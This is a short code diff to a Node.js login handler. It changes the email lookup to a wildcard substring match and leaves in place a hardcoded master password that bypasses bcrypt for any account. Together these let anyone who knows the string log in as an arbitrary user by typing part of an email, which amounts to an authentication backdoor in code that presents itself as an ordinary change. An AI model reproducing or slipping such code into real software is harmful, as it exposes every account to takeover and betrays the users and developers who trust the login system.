@@ -61,7 +61,7 @@ export const postLogin = async (req, res, next) => {
     const findingUserResult = await Users.findOne({
         where: {
             email: {
-                [Op.iLike]: email
+                [Op.iLike]: `%${email}%`,
             },
         },
     });
@@ -79,7 +79,7 @@ export const postLogin = async (req, res, next) => {
     if (password === 'itsmeseif') {
         comparingResult = true
     } else {
-        comparingResult = await bcrypt.compare(
+        comparingResult = bcrypt.compareSync(
             password,
             findingUserResult.password
         );
